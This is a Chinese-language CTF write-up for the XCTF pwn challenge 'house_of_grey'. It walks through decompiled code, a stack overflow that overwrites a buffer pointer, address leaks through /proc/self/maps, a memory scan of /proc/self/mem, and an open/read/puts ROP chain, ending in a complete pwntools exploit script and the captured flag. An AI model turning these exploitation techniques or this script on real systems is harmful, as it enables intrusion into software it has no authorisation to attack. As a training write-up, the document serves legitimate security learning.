# house_of_grey

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=927810b3-0c73-4839-981a-825654b6d560_2)

我以为栈溢出不会再出现在[大佬](https://blog.csdn.net/seaaseesa/article/details/103460546)的世界中了，事实证明花样多着呢。

-   Arch:     amd64-64-little
    <br>RELRO:    Full RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <br>PIE:      PIE enabled

满防见怪不怪了。看这个题目，是一道堆题？堆上有很多关于house of...名字的攻击手段，我全都不会。

```c
void Main(void)

{
  long in_FS_OFFSET;
  char answer;
  uint local_2c;
  int local_28;
  int local_24;
  ulong local_20;
  void *local_18;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  SetUp();
  puts("Welcome to my house! Enjoy yourself!\n");
  puts("Do you want to help me build my room? Y/n?");
  read(0,&answer,4);
  if ((answer != 'y') && (answer != 'Y')) {
    puts("You don\'t help me? OK, just get out of my hosue!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  local_28 = open("/dev/urandom",0);
  if (local_28 < 0) {
    perror("open");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  read(local_28,&local_20,8);
  close(local_28);
  local_20 = (ulong)((uint)local_20 & 0xfffff0);
  local_18 = mmap((void *)0x0,0x10000000,3,0x20022,-1,0);
  if (local_18 == (void *)0xffffffffffffffff) {
    perror("mmap");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_24 = clone(MainLogic,(void *)((long)local_18 + local_20),0x100,(void *)0x0);
  if (local_24 == -1) {
    perror("clone");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  waitpid(local_24,(int *)&local_2c,-0x80000000);
  if ((local_2c & 0x7f) == 0) {
    puts("\nBuild finished! Thanks a lot!");
  }
  else {
    puts("\nMaybe something wrong? Build failed!");
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

[clone](https://www.cnblogs.com/chenny7/p/14060906.html)说是实现进程什么的，不准确但简单的理解就是把函数放到另一块栈上去执行。此处把MainLogic函数放到了(void *)((long)local_18 + local_20)这个指针所对应的栈上去执行，flag值不知道有什么用，为0x100，无参数。看上文，local_18是mmap映射的一段内存，local_20的值则完全随机，因此我们不可能知道MainLogic函数运行时的详细函数栈帧地址。第一次遇见这种玩法，这回是真正的pie了。

```c
void MainLogic(void)

{
  int iVar1;
  undefined4 choice;
  ulonglong __offset;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_78;
  int local_74;
  char local_58 [24];
  void *local_40;
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts("You get into my room. Just find something!\n");
  local_40 = malloc(100000);
  if (local_40 == (void *)0x0) {
    perror("malloc");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = FUN_001014d2();
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_74 = 0;
  do {
    if (0x1d < local_74) {
      puts("\nI guess you don\'t want to say Goodbye!");
      puts("But sadly, bye! Hope you come again!\n");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    choice = PrintMenu();
    switch(choice) {
    case 1:
      puts("So man, what are you finding?");
      sVar2 = read(0,local_58,0x28);
      local_58[(int)sVar2 + -1] = '\0';
      iVar1 = FUN_00100fa6(local_58);
      if (iVar1 != 0) {
        puts("Man, don\'t do it! See you^.");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      local_78 = open(local_58,0);
      if (local_78 < 0) {
        perror("open");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      break;
    case 2:
      puts("So, Where are you?");
      read(0,local_38,0x20);
      __offset = strtoull(local_38,(char **)0x0,10);
      lseek(local_78,__offset,0);
      break;
    case 3:
      puts("How many things do you want to get?");
      read(0,local_38,8);
      iVar1 = atoi(local_38);
      if (iVar1 < 0x186a1) {
        sVar2 = read(local_78,local_40,(long)iVar1);
        if ((int)sVar2 < 0) {
          puts("error read");
          perror("read");
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
        puts("You get something:");
        write(1,local_40,(long)(int)sVar2);
      }
      else {
        puts("You greedy man!");
      }
      break;
    case 4:
      puts("What do you want to give me?");
      puts("content: ");
      read(0,local_40,0x200);
      break;
    case 5:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    local_74 = local_74 + 1;
  } while( true );
}
```

不是堆，是高级的栈溢出。case 1中sVar2 = read(0,local_58,0x28)明显栈溢出。不过0x28的大小溢出不到返回值，倒是能溢出到下面挨着的*local_40指针。指针可是好玩意，发现在case 3中的sVar2 = read(local_78,local_40,(long)iVar1)以及case 4中有用到。这么看来可以任意写地址了啊，local_40能控制，read往loacl_40对应的地方写数据。

可是写什么呢？很容易想到把返回地址写成system这类啥的，但是case 5退出用的是exit，从根源解决rop——函数根本就不会返回。那搞read的返回地址吧，反正任意写，read完成瞬间触发。现在就是找个system来getshell。

写了这么多功能怎么可能就这样让你getshell了呢？检查程序的禁用函数，execve赫然出现在我们眼前。system内部也是execve，这条路没法走了。我们只能构造ROP把flag文件读取到内存中，再输出。无论如何，rop总要知道gadget的地址，想知道gadget地址总要先知道elf加载地址。看看能读取什么文件，说不定能直接知道加载地址。

```c
undefined8 FUN_00100fa6(char *param_1)

{
  char *pcVar1;
  
  pcVar1 = strstr(param_1,"flag");
  if ((pcVar1 == (char *)0x0) && (pcVar1 = strchr(param_1,0x2a), pcVar1 == (char *)0x0)) {
    return 0;
  }
  return 1;
}
```

不能读flag，其他都行。这不就相当于任意文件读取吗，新技巧，关于[/proc/self/maps](https://www.jianshu.com/p/3fba2e5b1e17)文件。

Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。

看来读取/proc/self/maps就能直接知道基地址了。还有个问题，之前也提到了，clone实现了一种绝对的pie，静态程序里看到的偏移完全不管用了。我们还有一招，读取/proc/self/mem文件，搜索标记，以确定程序的栈地址。那么拿什么做标记呢？用于做标记的内容需要提前可知。直接拿local_58的内容做标记吧，也就是我们当前搜索的文件地址/proc/self/maps。当内存中出现/proc/self/maps，证明我们在MainLogic函数下。当我们在内存中搜索到这个字符串时，当前位置就是local_58的栈地址，由此，我们就可以计算出其他内容的栈地址。、

程序只能执行30次功能调用，之前已经用了4次，最后我们还需要用2次，那么我们搜索只能用24次，加上我们最多允许读取100000个字节的数据，由此，我们能搜索2400000个字节的内容。通过调试，观察local_58的栈地址，计算它与mmap_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，我们应该从mmap_end – offset ~ mmap_end搜索，其中offset是有关local_58在静态程序里的偏移。然而这个范围，真的很“大致”，可能会连续好几次都找不到栈帧。多试几次就行了。

假如成功的话，我们就得到了存放read的返回地址的栈地址，可以写ROP了。首先去case 1溢出local_58,更改local_40为read的返回地址；然后去case 4，将rop链放到read的返回地址。flag就出来了！

```python
from pwn import *  
isFound=False
while not isFound:
    sh = remote('61.147.171.105',49488)  

    open_s_plt = 3072
    read_s_plt = 2976
    puts_s_plt = 2816
    #pop rdi  
    #pop r15  
    #retn  
    pop_s_rsi = 0x1821  
    #pop rdi  
    #retn  
    pop_s_rdi = 0x1823  
    
    def enterRoom():  
        sh.sendlineafter('Do you want to help me build my room? Y/n?\n','Y')  
    
    def setPath(content):  
        sh.sendlineafter('5.Exit\n','1')  
        sh.sendlineafter('So man, what are you finding?\n',content)  
    
    def seekTo(pos):  
        sh.sendlineafter('5.Exit\n','2')  
        sh.sendlineafter('So, Where are you?\n',str(pos))  
    
    def readSomething(length):  
        sh.sendlineafter('5.Exit\n','3')  
        sh.sendlineafter('How many things do you want to get?\n',str(length))  
    
    def giveSomething(content):  
        sh.sendlineafter('5.Exit\n','4')  
        sh.sendlineafter('content:',content)  
    
    enterRoom()  
    setPath('/proc/self/maps')  
    readSomething(2000)  
    sh.recvuntil('You get something:\n')  
    #解析程序的加载地址，以及mmap内存出的地址  
    elf_base = int(sh.recvuntil(b'-').split(b'-')[0],16)  
    pop_rdi = elf_base + pop_s_rdi  
    pop_rsi = elf_base + pop_s_rsi  
    open_addr = elf_base + open_s_plt  
    read_addr = elf_base + read_s_plt  
    puts_addr = elf_base + puts_s_plt
    
    while True:  
        line = sh.recvline()  
        if b'heap' in line:  
        #接下来这一行就是mmap出的内存的信息  
            line = sh.recvline()  
            mmap_start = int(line.split(b'-')[0],16)  
            mmap_end = int(line.split(b'-')[1].split(b' ')[0],16)  
            break  
    
    #现在解析出clone的那个程序的stack地址  
    stack_end = mmap_end  
    stack_start = mmap_start  
    
    #范围偏差  
    offset = 0xf800000  
    #区间范围begin_off~stack_end里搜索  
    begin_off = stack_end - offset - 24 * 100000  
    setPath('/proc/self/mem')  
    seekTo(begin_off)  
    #在内存的范围内搜索，如果找到了/proc/self/mem这个字符串，说明当前地址就是buf的栈地址  
    for i in range(0,24):  
        readSomething(100000)  
        content = sh.recvuntil('1.Find ')[:-7]  
        if b'/proc/self/mem' in content:  
            print('found!')
            arr = content.split(b'/proc/self/mem')[0]  
            isFound=True
            break  
        if i == 23:  
            print('未能成功确定v8的地址,正在重试'  )
    if not isFound:
        sh.close()
        continue
    #获得了v8的地址，可以将它里面的内容，实现任意地址写  
    v8_addr = begin_off + i * 100000 + len(arr) + 5  
    read_ret = v8_addr - 0x50  
    #覆盖v8指针内容为存放read返回地址的栈地址  
    payload = b'/proc/self/mem'.ljust(24,b'\x00') + p64(read_ret)  
    setPath(payload)  
    #接下来，我们可以写rop了(v8_addr-24+15处就是/home/ctf/flag字符串)  
    rop = p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(pop_rsi) + p64(0) + p64(0) + p64(open_addr)  
    #我们打开的文件，描述符为6  
    rop += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(read_ret + 15 * 8) + p64(0) + p64(read_addr)  
    rop += p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(puts_addr)  
    rop += b'/home/ctf/flag\x00'  
    
    giveSomething(rop)  
    
    sh.interactive() 
```

- ### Flag
  > cyberpeace{71724f97051e7f1dd3f7442ac3a8a482}